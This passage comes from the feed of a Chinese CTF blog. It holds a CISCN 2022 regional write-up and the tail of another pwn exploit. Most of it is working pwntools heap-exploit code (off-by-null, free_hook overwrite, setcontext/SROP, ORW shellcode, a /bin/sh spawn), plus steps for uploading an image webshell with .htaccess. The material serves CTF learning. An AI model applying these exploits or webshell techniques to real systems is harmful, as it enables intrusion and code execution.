number">0x8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"bss: 0x%x"</span><span class="token punctuation">,</span> bss<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nDone'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ec980</span><span class="token comment">#stdin</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_addr: 0x%x'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token comment"># libc.address = libc_base</span>poc <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>poc <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">,</span>poc<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>没做出来。。。惭愧惭愧</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Arch-linux记录</title>
    <link href="/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="463ea604923a78f62c1947fa4e356b24cc25ace22e09954c78b5566509f19ecf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">已经在做了，快了快了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ArchLinux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN华中赛区分区赛-部分wp</title>
    <link href="/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/"/>
    <url>/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<blockquote><p>首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1723">https://forum.butian.net/share/1723</a></p></blockquote><p>这次分区赛成绩不太理想，有些题目确实有点脑洞，花了很久的时间才做出来，加上题目分值感觉也有点离谱，misc和re真的是大爷了，pwn，web属于是打酱油。</p><p>最后只有15名，随便解出来一个题就进决赛了，，，😭</p><h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3><p>目录穿越，对脑电波找文件，找了半天以为要rce，结果是flag.php。。。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fd5d3335b36c5a77b504a80b7f83f21bb4cccef4.png" alt="图片.png"></p><h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3><p>首先，使用burpsuite抓包，返回报文中有identity字段</p><p>加入identity字段后,返回一个可以文件上传的页面A0ther_hldden_PaGe.php</p><p>经过fuzz之后只能上传.jpg，同时发现可以上传.htaccess，因此上传图片马，并上传.htaccess使之解析为php</p><p>之后使用蚁剑链接，找到flag。<br>（web选手没有存图）</p><h3 id="pwn1"><a class="header-anchor" href="#pwn1">¶</a>pwn1</h3><p>上午发的第一道pwn，也是唯一解出来的一道pwn，webpwn，但是只是模拟了http的请求处理过程，而没有开web端口之类的，类似于httpd，重点还是审计代码。<br>审完之后是在edit处存在一个off_by_NULL。<br>环境是libc2.27，开了沙箱需要orw。照着板子，后面绕一下0截断就行了。<br>exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token comment">#----------------------------------------------</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#----------------------------------------------</span>http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /&#123;&#125; HTTP/1.1\r\nHost: Epiphany\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length\r\n'''</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("10.75.1.22",'58012')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /login HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUsername: C4oy1\r\nPassword: 123\r\nContent-Length: &#123;&#125;\r\n\r\nUsername=C4oy1&amp;Password=123\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0x1e</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /create HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit11</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit22</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /delete HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /show HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">replace0</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'\0'</span><span class="token punctuation">:</span>            r <span class="token operator">+=</span> <span class="token string">'a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">+=</span> i    <span class="token keyword">return</span> rlogin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''gdb.attach(sh, "b *$rebase(0x00000000000280C))pause()'''</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>set_context  <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>mprotect <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#off by null</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>edit11<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x460</span><span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>free_hook <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>free_hook <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>sig <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sig<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span>sig<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x2000</span>sig<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>sig<span class="token punctuation">.</span>rip <span class="token operator">=</span> mprotectsig<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> sc<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>sc_addr <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">0x28</span><span class="token comment"># gdb.attach(sh, "b *$rebase(0x00000000000280C)\nc\n")</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x12</span> <span class="token operator">+</span> sc<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> replace0<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xaf</span><span class="token 